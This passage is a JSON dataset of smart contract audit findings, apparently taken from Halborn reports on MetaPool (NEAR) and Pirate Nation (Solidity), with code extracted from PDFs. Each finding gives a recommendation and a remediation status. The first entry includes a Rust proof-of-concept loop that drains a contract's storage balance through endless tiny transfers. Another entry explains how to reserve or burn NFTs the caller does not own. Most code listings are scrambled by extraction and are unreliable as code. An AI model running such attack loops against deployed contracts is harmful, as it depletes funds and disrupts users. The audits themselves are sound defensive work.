. call ( metapool_contract . id () , \" add_tokens_to \" ) . args_json ( json! ({ \" account_id \": user_accounts [0]. id () , }) ) . transact () . await ? . into_result () ?; user_accounts [0] . call ( metapool_contract . id () , \" add_tokens_to \" ) . args_json ( json! ({ \" account_id \": user_accounts [1]. id () , }) ) . transact () . await ? . into_result () ?; // Storage bloating via many small transfers let mut dummy_user_index = 0; println! (\" Starting vulnerable scenario ... \" ); loop { let this_user_account_id = format! ( \" dummyuser {} \" ,  dummy_user_index ); 188 189 190 191 192 193 194 195 user_accounts [0] . call ( metapool_contract . id () , \" ft_transfer \") . args_json ( json! ({ \" receiver_id \" : this_user_account_id , \" amount \": \"1 \" , \" memo \" : None :: < String > }) ) 24 196 197 198 199 200 201 202 203 204 205 } . deposit (1) . transact () . await ? . into_result () ?; dummy_user_index += 1; } Ok (() ) Recommendation: It is recommended to require a storage deposit from new users so that the storage fees will always be covered. Alternatively, if such a mechanism is not possible to be implemented for business reasons, the balance of the contract should be constantly monitored, and NEAR tokens should be automatically deposited to the contract once free balance reaches a previously defined threshold. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit f11ba493 by imple- menting a storage fee mechanism. 25 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "USAGE OF OUTDATED DEPENDENCIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that dependencies defined in Cargo.toml file for MetaPool contract are not using their latest versions. Namely:  near-sdk  near-contract-standards  uint  quickcheck  quickcheck_macros  env_logger Code Location: Listing 5: metapool/Cargo.toml (Lines 16,17,24,28,29,31) 11 [ dependencies ] 12 13 # near - sdk = \" 2.0.1 \" 14 # near - sdk = { git = \" https :// github . com / Narwallets / near - sdk - rs \" } 15 16 near - sdk = { git = \" https :// github . com / near / near - sdk - rs . git \" , tag =  \" 3.1.0 \" } 17 near - contract - standards = { git = \" https :// github . com / near / near -  sdk - rs . git \" , tag = \" 3.1.0 \" } 18 19 20 # near - sdk = { git = \" https :// github . com / near / near - sdk - rs \" , tag = \"  3.0.1 \" } 21 # near - contract - standards = { git = \" https :// github . com / near / near -  sdk - rs . git \" , tag = \" 3.0.1 \" } 22 23 24 uint = { version = \" 0.8.3 \" , default - features = false } 25 26 [ dev - dependencies ] 26 27 lazy_static = \" 1.4.0 \" 28 quickcheck = \" 0.9 \" 29 quickcheck_macros = \" 0.9 \" 30 log = \" 0.4 \" 31 env_logger = { version = \" 0.7.1 \" , default - features = false } 32 33 rand = \" * \" 34 rand_pcg = \" *\" 35 36 # near - crypto = { git = \" https :// github . com / nearprotocol / nearcore .  git \" } 37 # near - primitives = { git = \" https :// github . com / nearprotocol /  nearcore . git \" } 38 39 near - sdk - sim = { git = \" https :// github . com / near / near - sdk - rs \" , tag =  \" 3.1.0 \" } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to update the dependencies to the latest available stable versions. Remediation Plan: ACKNOWLEDGED: The MetaPool team acknowledged this issue, and decided not to change the currently used version due to significant changes in the SDK API. 27 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT STATE VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the MetaPool contract implements a manual assertion in the new function that checks if the contracts state already ex- ists. However, the new function is also marked with #[init] macro which implements this behavior by default, making manual assertion redundant. Code Location: Listing 6: metapool/src/lib.rs (Line 289) 282 #[ init ] 283 pub fn new ( 284 285 286 287 288 ) -> Self { 289 owner_account_id : AccountId , treasury_account_id : AccountId , operator_account_id : AccountId , meta_token_account_id : AccountId , assert! ( !env :: state_exists () , \" The contract is already  initialized \" ); 290 291 292 293 294 295 296 297 298 let result = Self { owner_account_id , contract_busy : false , operator_account_id , treasury_account_id , contract_account_balance : 0 , web_app_url : Some ( String :: from ( DEFAULT_WEB_APP_URL )) , auditor_account_id : Some ( String :: from (  DEFAULT_AUDITOR_ACCOUNT_ID )) , 299 operator_rewards_fee_basis_points :  DEFAULT_OPERATOR_REWARDS_FEE_BASIS_POINTS , 300 operator_swap_cut_basis_points :  DEFAULT_OPERATOR_SWAP_CUT_BASIS_POINTS , treasury_swap_cut_basis_points :  DEFAULT_TREASURY_SWAP_CUT_BASIS_POINTS , staking_paused : false , 301 302 28 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 total_available : 0, total_for_staking : 0, total_actually_staked : 0, total_unstaked_and_waiting : 0 , retrieved_for_unstake_claims : 0, total_unstake_claims : 0, epoch_stake_orders : 0, epoch_unstake_orders : 0, epoch_last_clearing : 0, accumulated_staked_rewards : 0 , total_stake_shares : 0, total_meta : 0 , accounts : UnorderedMap :: new (b \"A \" . to_vec () ) , loan_requests : LookupMap :: new (b \" L\" . to_vec () ) , nslp_liquidity_target : 10 _000 * NEAR , nslp_max_discount_basis_points : 180 , // 1.8% nslp_min_discount_basis_points : 25 , min_deposit_amount : 10 * NEAR , // / for each stNEAR paid as discount , reward stNEAR sellers // 0.25%  with META . initial 5x , default :1 x . reward META = discounted *  mult_pct / 100 322 323 stnear_sell_meta_mult_pct : 50 , // 5 x // / for each stNEAR paid staking reward , reward stNEAR  holders with META . initial 10 x , default :5 x . reward META = rewards  * mult_pct / 100 324 325 staker_meta_mult_pct : 5000 , // 500 x // / for each stNEAR paid as discount , reward LPs with META .  initial 50 x , default :20 x . reward META = fee * mult_pct / 100 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 } lp_provider_meta_mult_pct : 200 , // 20 x staking_pools : Vec :: new () , meta_token_account_id , est_meta_rewards_stakers : 0 , est_meta_rewards_lu : 0, est_meta_rewards_lp : 0, max_meta_rewards_stakers : 1 _000_000 * ONE_NEAR , max_meta_rewards_lu : 50 _000 * ONE_NEAR , max_meta_rewards_lp : 100 _000 * ONE_NEAR , unstaked_for_rebalance : 0, unstake_for_rebalance_cap_bp : 100 , }; // all key accounts must be different result . assert_key_accounts_are_different () ; return result ; 29 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the redundant code. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by removing the redundant code. 30 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION CAN BE REPLACED BY MACRO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "was observed implements the It that prede- the if assert_callback_calling() cessor AccountId equals the current AccountId. Such functionality can also be achieved by using #[private] macro, which will reduce the codebase and make the code more readable. MetaPool that contract verifies the function Code Location: Listing 7: metapool/src/utils.rs assert_eq! ( env :: predecessor_account_id () , env :: 33 pub fn assert_callback_calling () { 34  current_account_id () ); 35 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to use the #[private] macro instead of manual assertions. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by using the #[private] macro over the assert_callback_calling function. 31 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "DEAD CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that code inside validator_loans.rs file is mostly com- mented out, leaving one struct, which is used in the MetaPool contracts storage. However, it was observed that no logic is associated with that field, making it not necessary in the contract. Code Location: Listing 8: metapool/src/validator_loans.rs (Lines 3-6) // total requested pub amount_requested : u128 , 3 pub struct VLoanRequest { 4 5 6 } 7 8 /* 9 use crate ::*; 10 use near_sdk :: serde ::{ Deserialize , Serialize }; 11 12 pub use crate :: types ::*; 13 pub use crate :: utils ::*; 14 15 // - - - - - - - - - - - - - - - - - - - - - - - - 16 // 17 // - - - - - - - - - - - - - - - - - - - - - - - - 18 pub const DRAFT : u8 = 0; 19 pub const ACTIVE : u8 = 1; 20 pub const REJECTED : u8 = 2; 21 pub const APPROVED : u8 = 3; 22 pub const FEE_PAID : u8 = 4; 23 pub const EXECUTING : u8 = 5; 24 pub const COMPLETED : u8 = 6; 25 26 const ACTIVATION_FEE : u128 = 5 * NEAR ; 27 const MIN_REQUEST : u128 = 10 * K_NEAR ; 28 Validator Loan Req Status 32 29 (...) Listing 9: metapool/src/lib.rs 101 #[ near_bindgen ] 102 #[ derive ( BorshDeserialize , BorshSerialize , PanicOnDefault )] 103 pub struct MetaPool { 104 105 106 107 // validator loan request // action on audit suggestions , this field is not used . No (...)  need for this to be on the main contract pub loan_requests : LookupMap < AccountId , VLoanRequest >, (...) 108 109 110 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the loan_requests field from the contracts storage and delete the validator_loans.rs file from the repository. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by removing the unnecessary files. 33 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE OPTIMIZATIONS TO REDUCE BINARY SIZE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Contract size directly corresponds to the costs associated with its operation, mainly - the deployment. Although many of the strategies aimed at reducing the compiled binary size achieve this goal at the expense of code readability, there are some measures that could be implemented without such sacrifices. It was observed that Cargo.toml file of MetaPool contract specified the crate-type as both cdylib and rlib, however usually only cdylib is necessary. Additionally, the release compilation profile used opt-level option set to s. Specifying the crate-type to only cdylib and changing the opt-level to z resulted in a wasm binary size reduction of 14%. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change the crate-type parameter to cdylib and opt- level to z in Cargo.toml files to reduce the size of compiled binary. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by changing the crate-type parameter to contain only cdylib value and by setting the opt-level to a value of z. 34 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNECESSARY PROMISE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that MetaPool contract defines a set_reward_fee function that is responsible for setting operators rewards. This function is set as payable; however, it returns all the attached deposit, except 1 yocto NEAR. As such, it is not necessary to schedule that promise, and simply change the implementation to use assert_one_yocto function, which will reduce the code complexity and cost of executing that set_reward_fee function. Code Location: Listing 10: metapool/src/lib.rs (Lines 488-490) 479 #[ payable ] 480 pub fn set_reward_fee (& mut self , basis_points : u16 ) { 481 482 483 484 self . assert_owner_calling () ; assert! ( env :: attached_deposit () > 0) ; assert! ( basis_points < 1000) ; // less than 10% //  DEVELOPERS_REWARDS_FEE_BASIS_POINTS is included 485 486 self . operator_rewards_fee_basis_points = basis_points . saturating_sub (  DEVELOPERS_REWARDS_FEE_BASIS_POINTS ); 487 488 489 // return the deposit ( except 1 yocto ) if env :: attached_deposit () > 1 { Promise :: new ( env :: predecessor_account_id () ). transfer ( env ::  attached_deposit () ); 490 491 } } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 35 Recommendation: It is recommended to remove balance transfer from the set_reward_fee function and introduce an assert_one_yocto function to make sure that the attached deposit is equal to exactly 1 yocto NEAR. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 52bf32f8 by sim- plifying the implementation to require one yocto of attached deposit. 36 ",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "TYPO IN SIMULATION TESTING CAUSES FUZZ TESTS NOT TO EXECUTE PROPERLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The MetaPool contract uses a near-sdk-sim crate to simulate the contracts operation in the blockchain environment. In order to identify bugs, It was observed that they are not fuzz-based tests are implemented. always completely successful. It was identified that the root cause of Namely, the Action:: this behavior was a typo in the parameter name. LiquidUnstake branch improperly named the parameter stnear_to_burn. Code Location: Listing 11: metapool/tests/sim/simulation_fuzzy.rs (Line 131) println! (\" step_random_action {:?} {} \" , action , amount_near ); return match action { 72 pub fn step_random_action ( sim : & Simulation , 73 acc : & UserAccount , 74 action : Action , 75 amount_near : u64 , 76 77 pre : & State , 78 ) -> Result < StateAndDiff , String > { 79 80 81 82 83 84 85 86 87 88 89 90 91 & sim , & acc , \" deposit_and_stake \" , json! ({}) , 50 * TGAS , amount_near as u128 * NEAR , & pre , Action :: Stake => step_call ( ) , Action :: AddLiquidity => step_call ( 37 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 & sim , & acc , \" nslp_add_liquidity \" , json! ({}) , 200 * TGAS , amount_near as u128 * NEAR , & pre , ) , Action :: RemoveLiquidity => step_call ( & sim , & acc , \" nslp_remove_liquidity \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 200 * TGAS , NO_DEPOSIT , & pre , ) , Action :: DelayedUnstake => step_call ( & sim , & acc , \" unstake \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 100 * TGAS , NO_DEPOSIT , & pre , ) , Action :: DUWithdraw => step_call ( & sim , & acc , \" withdraw \" , json! ({ \" amount \" : ntoU128 ( amount_near ) }) , 50 * TGAS , NO_DEPOSIT , & pre , ) , Action :: LiquidUnstake => step_call ( & sim , & acc , \" liquid_unstake \" , json! ({ \" stnear_to_burn \" : ntoU128 ( amount_near ) , \"  min_expected_near \" : ntoU128 ( amount_near *95/100) }) , 132 133 134 50 * TGAS , NO_DEPOSIT , & pre , 38 135 136 137 ) , Action :: BotDistributes => bot_distributes (& sim , & pre ) , Action :: BotEndOfEpochClearing => bot_end_of_epoch_clearing  (& sim , & pre ) , 138 139 140 Action :: BotRetrieveFunds => bot_retrieve (& sim , & pre ) , Action :: BotPingRewards => bot_ping_rewards (& sim , & pre ) , Action :: StartRebalanceUnstake => bot_rebalance_unstake (&  sim , & pre ) , 141 Action :: ChangePoolsWeight => bot_change_pools_weight (& sim , Action :: LastAction => panic! ( \" invalid action \" ) ,  & pre ) , 142 143 144 } }; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change the stnear_to_burn JSON key to the st_near_to_burn as defined in the liquid_unstake function. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit f11ba493 by cor- recting the typo. 39 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "MetaPool_Liquid_Staking_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "USERS CAN START A QUEST USING AS INPUT AND BURNING AN NFT THEY DO NOT OWN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the QuestSystem contract, the startQuest() function does not check that the NFT inputs are actually owned by the caller: Listing 1: QuestSystem.sol (Lines 371-389) 305 function startQuest ( QuestParams calldata params ) 306 307 308 309 310 { 311 external nonReentrant whenNotPaused returns ( uint256 ) QuestDefinition storage questDef = _questDefinitions [ params .  questId ]; 312 313 314 315 316 address account = _msgSender () ; // Verify user can start this quest and meets requirements require ( _isQuestAvailable ( account , params . questId , questDef ) ==  true , 317 318 319 320 321 \" QUEST_NOT_AVAILABLE : Sender cannot start this quest \" ); require ( params . inputs . length == questDef . inputs . length , \" INPUT_LENGTH_MISMATCH : Inputs to quest do not match to  quest definition \" 322 323 324 325 326 327 ); // Create active quest object _activeQuestCounter . increment () ; uint256 activeQuestId = _activeQuestCounter . current () ; 23 328 ActiveQuest storage activeQuest = _activeQuests [ activeQuestId  ]; 329 330 331 332 333 334 335 336 337 activeQuest . account = account ; activeQuest . questId = params . questId ; activeQuest . startTime = SafeCast . toUint32 ( block . timestamp ); activeQuest . status = ActiveQuestStatus . IN_PROGRESS ; // Track activeQuestId for this account _accountData [ account ]. activeQuestIds . add ( activeQuestId ); // Verify that the params have inputs that meet the quest  requirements 338 339 340 for ( uint8 idx = 0; idx < questDef . inputs . length ; idx ++) { QuestInput storage inputDef = questDef . inputs [ idx ]; GameRegistryLibrary . TokenPointer memory input = params .  inputs [ idx ]; 341 342 343 344 345 // Make sure token types match require ( input . tokenType == inputDef . tokenPointer . tokenType , \" TOKEN_TYPES_NOT_MATCHING : Token type is not matching  that expected by the quest \" 346 347 348 349 350 351 ); // Make sure proper token address was provided require ( inputDef . tokenPointer . tokenContract == address (0) || inputDef . tokenPointer . tokenContract == input .  tokenContract , 352 \" EXPECTED_SPECIFIC_TOKEN : Expected a specific token  address \" 353 354 355 356 357 358 359 360 ); GameRegistryLibrary . TokenType tokenType = inputDef . tokenPointer . tokenType ; uint32 reservationId = 0; // Check token type to ensure that the input matches what  the quest expects 361 362 363 if ( tokenType == GameRegistryLibrary . TokenType . ERC20 ) { require ( _hasAccessRole ( 24 364 GameRegistryLibrary .  GAME_CURRENCY_CONTRACT_ROLE , 365 366 367  \" 368 369 370 371 input . tokenContract ) == true , \" NOT_GAME_CURRENCY : Expected GameCurrency contract ); // TODO : Find a way to either lock or burn ERC20 stuff } else if ( tokenType == GameRegistryLibrary . TokenType .  ERC721 ) { 372 373 374 375 376 377 378 379 380 381  tokenId ); 382 383 384 385 386 387 388 389 390 // Auto - Lock NFT if necessary ILockingSystem lockingSystem = _lockingSystem () ; lockingSystem . isNFTLocked ( input . tokenContract , input . tokenId ) == false lockingSystem . lockNFT ( input . tokenContract , input . if ( ) { } reservationId = lockingSystem . addNFTReservation ( input . tokenContract , input . tokenId , true , GameRegistryLibrary . RESERVATION_QUEST_SYSTEM ); } else if ( tokenType == GameRegistryLibrary . TokenType .  ERC1155 ) { 391 392 393 394 395 396 397 398 399 400 401 402 reservationId = _lockingSystem () . addItemReservation ( account , input . tokenContract , input . tokenId , input . amount , true , GameRegistryLibrary . RESERVATION_QUEST_SYSTEM ); } // Perform all trait checks for ( 25 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 } uint8 traitIdx = 0; traitIdx < inputDef . traitChecks . length ; traitIdx ++ ) { TraitsLibrary . requireTraitCheck ( inputDef . traitChecks [ traitIdx ], ITraitsConsumer ( input . tokenContract ) , input . tokenId ); } activeQuest . inputs . push ( GameRegistryLibrary . ReservedToken ({ tokenType : input . tokenType , tokenId : input . tokenId , tokenContract : input . tokenContract , amount : input . amount , reservationId : reservationId }) ); } emit QuestStarted ( account , params . questId , activeQuestId ); return activeQuestId ; Moreover, when the quest inputs are unlocked upon quest completion in the _unlockQuestInputs() the NFT reservation is removed, but the NFT remains locked: Listing 2: QuestSystem.sol (Lines 718-726) 656 function _unlockQuestInputs ( address account , 657 QuestDefinition storage questDef , 658 ActiveQuest storage activeQuest , 659 bool isSuccess , 660 661 uint256 randomWord 662 ) internal { 663 664 665 uint32 successXp = isSuccess ? questDef . successXp : 0; // Unlock inputs , grant XP , and potentially burn inputs 26 666 667 668 669 670 671 672 673  / 674 675 676 677 678 679 680 681 682 683 684 685 686 687 688 689 690 691 692 693 694 695 696 for ( uint8 idx = 0; idx < questDef . inputs . length ; idx ++) { QuestInput storage input = questDef . inputs [ idx ]; GameRegistryLibrary . ReservedToken storage activeQuestInput = activeQuest . inputs [ idx ]; // Grant XP on success if ( successXp > 0 && input . xpEarnedPercent > 0) { uint32 xpAmount = ( successXp * input . xpEarnedPercent ) GameRegistryLibrary . PERCENTAGE_RANGE ; if ( xpAmount > 0) { ITraitsConsumer ( activeQuestInput . tokenContract ) . incrementTrait ( activeQuestInput . tokenId , TraitsLibrary . XP_TRAIT_ID , xpAmount ); } } // Determine if the input should be burned bool shouldBurn ; if ( input . consumable ) { uint256 burnRate = isSuccess ? input . successBurnRate : input . failureBurnRate ; if ( burnRate == 0) { shouldBurn = false ; } else if ( burnRate == GameRegistryLibrary .  PERCENTAGE_RANGE ) { 697 698 699 700 701 702 703 704 705 706 707 shouldBurn = true ; } else { randomWord = _nextRandomWord ( randomWord ); ( shouldBurn , randomWord ) = _weightedCoinFlip ( randomWord , burnRate ); } } // Unlock / burn based on token type 27 708 709 710 711 712 713  ( 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 743 744 745 746 747 } if ( ) { activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC20 if ( shouldBurn ) { IGameCurrency ( activeQuestInput . tokenContract ). burn account , activeQuestInput . amount ); } } else if ( activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC721 ) { _lockingSystem () . removeNFTReservation ( activeQuestInput . tokenContract , activeQuestInput . tokenId , activeQuestInput . reservationId ); } else if ( activeQuestInput . tokenType == GameRegistryLibrary . TokenType . ERC1155 ) { _lockingSystem () . removeItemReservation ( account , activeQuestInput . tokenContract , activeQuestInput . tokenId , activeQuestInput . reservationId ); if ( shouldBurn ) { IGameItems ( activeQuestInput . tokenContract ). burn ( account , SafeCast . toUint32 ( activeQuestInput . tokenId ) , activeQuestInput . amount ); } } } Based on this, initially a user would not be able to use the NFT of 28 another user as input as during the lockNFT() call the transaction would revert with the ORIGIN_NOT_NFT_OWNER error. Although, once the original owner has started and completed that quest with that NFT as input, the NFT would remain locked and as this NFT is already locked any user would be able now to start a quest using that NFT as the NFT ownership is not checked to create a reservation nor in the startQuest() function. This would create an exclusive reservation and while this quest is ongoing, the original owner would not be able to make use of that NFT. Moreover, if the issue described in ERC721 INPUTS ARE NEVER BURNT WHEN THE QUEST INPUTS ARE UNLOCKED was fixed, this NFT could be burnt during this process, leaving the original owner without his NFT. Basically, any user would be able to burn someone elses NFT using it as a quest input. 29 Proof of Concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to: 1. Add a require statement that checks that the caller owns the NFT in the TokenType.ERC721 if code block, in the startQuest() function. 30 2. Also, unlocking the NFT before removing the NFT reservation in the _unlockQuestInputs() function. Remediation Plan: The Proof of Play team SOLVED: _verifyInputOwnership(input, account); function that validates that the inputs are owned by the caller. GameHelperLibrary. startQuest() the the in added call 31 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: Critical"
        ]
    },
    {
        "title": "FLAWED LOGIC CAUSES THAT NAVIES WILL NEVER STEAL PIRATES GOLD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As per the documentation, in the contract StakingSystem, when pirates unstake their items, there should be a 50% chance for all of their gold being stolen by the navies. This logic is implemented in the functions _claimGameNFTStakeRewards() and fulfillRandomWordsCallback(). In the _claimGameNFTStakeRewards() function, the variable balance is set initially to zero, but then it is never updated with the number of Pirate Ships staked which means that every VRFRequest.balance will be zero: Listing 3: StakingSystem.sol (Lines 677,703) address nftContract , uint256 nftTokenId , bool unstake 657 function _claimGameNFTStakeRewards ( 658 659 660 661 ) internal { 662 663 664 665 require ( address relevantAccount = tx . origin ; IGameNFT ( nftContract ). ownerOf ( nftTokenId ) ==  relevantAccount , 666 \" ORIGIN_NOT_OWNER_OF_NFT : Origin is not the owner of the  specified NFT \" );  nftTokenId ]; require ( 667 668 669 670 671 GameNFTStake storage nftStake = stakedNFTs [ nftContract ][ nftStake . reservationId != 0 , 32 672 673 674 675 676 677 678 679 680 681 682 683 \" NFT_NOT_STAKED : NFT has not been staked \" ); uint256 goldOwed = 0; uint256 xpOwed = 0; uint256 balance = 0; for ( uint256 i = 0; i < nftStake . gameItemStakes . length ; i ++) { ( uint256 goldFromShip , uint256 xpFromShip ) = _claimGameItemStakeRewards ( nftStake . gameItemStakes [ i],  unstake ); 684 685 686 687 688 689 690 691 692 693 694 695 696 697 698 goldOwed += goldFromShip ; xpOwed += xpFromShip ; } // Grant XP if ( xpOwed > 0) { ITraitsConsumer ( nftContract ). incrementTrait ( nftTokenId , TraitsLibrary . XP_TRAIT_ID , xpOwed ); } if ( unstake ) { // Figure out final amount of gold the player earns with  some randomness 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 uint256 requestId = _requestRandomWords (1) ; vrfRequests [ requestId ] = VRFRequest ({ account : relevantAccount , goldOwed : goldOwed , balance : balance , nftContract : nftContract , nftTokenId : nftTokenId }) ; // Release hold on NFT _lockingSystem () . removeNFTReservation ( nftContract , nftTokenId , nftStake . reservationId ); 33 714 715 716 717 718 719 // Delete the stake delete stakedNFTs [ nftContract ][ nftTokenId ]; // Emit unstaked event emit NFTUnstaked ( relevantAccount , nftContract , nftTokenId ,  requestId ); } else { 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( relevantAccount , goldOwed ); } emit NFTRewardsClaimed ( relevantAccount , nftContract , nftTokenId , unstake , goldOwed ); } This means that when the fulFillRandomWordsCallback() function is called by Chainlink VRF: 1. uint256 coinFlips = randomness % (2**request.balance); 2. (2**request.balance)= (2**0)= 1, (considering that request.balance will always be 0 here) 3. uint256 coinFlips = randomness % 1, (any number divided by 1 will always have as remainder 0) 4. coinFlips will always be 0 5. if coinFlips is 0, numStolen will never be increased and will always be 0, hence: Navies will never steal pirates gold when they are unstaked. Listing 4: StakingSystem.sol (Lines 814-829) 802 function fulfillRandomWordsCallback ( 803 804 uint256 requestId , uint256 [] memory randomWords 34 805 ) external override onlyRole ( GameRegistryLibrary . RANDOMIZER_ROLE )  { 806 807 808 809 810 811 812 VRFRequest storage request = vrfRequests [ requestId ]; address account = request . account ; if ( account != address (0) ) { uint256 randomness = randomWords [0]; // This should not overflow since the balance is  determined by gameplay logic 813 814 // and the user wont have more than 256 ships per stake uint256 coinFlips = randomness % (2** request . balance ); //  50% chance of stealing gold per ship staked 815 816 817 818 819 820 821 822 823 824 825 826 uint256 numStolen = 0; uint256 goldOwed = request . goldOwed ; while ( coinFlips > 0) { if ( coinFlips & 1 == 1) { numStolen ++; } coinFlips = coinFlips >> 1; } if ( numStolen > 0) { uint256 owedToNavy = numStolen * ( goldOwed / request .  balance ); 827 828 829 830 831 832 833 834 835 836 837 838 839 840 841 842 843 844 _payNavyTax ( owedToNavy ); goldOwed = goldOwed - owedToNavy ; } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( account , goldOwed ); } // Emit event emit NFTRewardsClaimed ( account , request . nftContract , request . nftTokenId , true , goldOwed ); 35 delete vrfRequests [ requestId ]; 845 846 847 } } Proof of Concept: In the image below, 20 Pirate Ships are unstaked which are staked to Pirate ID 60 (command_rank of PirateId 60 = 4): Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the logic in the _claimGameNFTStakeRewards() function and increase accordingly the balance local variable before doing the _requestRandomWords(1) call. Remediation Plan: SOLVED: The Proof of Play team fixed the issue and now correctly updates the balance local variable before making the _requestRandomWords(1) call: 36 Listing 5: StakingSystem.sol (Line 681) 671 uint256 balance = 0; 672 673 for ( uint256 i = 0; i < nftStake . gameItemStakes . length ; i ++) { 674 GameItemStake storage gameItemStake = nftStake . gameItemStakes [  i ]; 675 676 677 678 679 680 681 682 } ( uint256 goldFromShip , uint256 xpFromShip ) = _claimGameItemStakeRewards ( gameItemStake , unstake ); goldOwed += goldFromShip ; xpOwed += xpFromShip ; balance += gameItemStake . balance ; 37 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: Critical"
        ]
    },
    {
        "title": "UNSAFE CAST CAN ALLOW USERS TO PERMANENTLY MINT GOLD TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
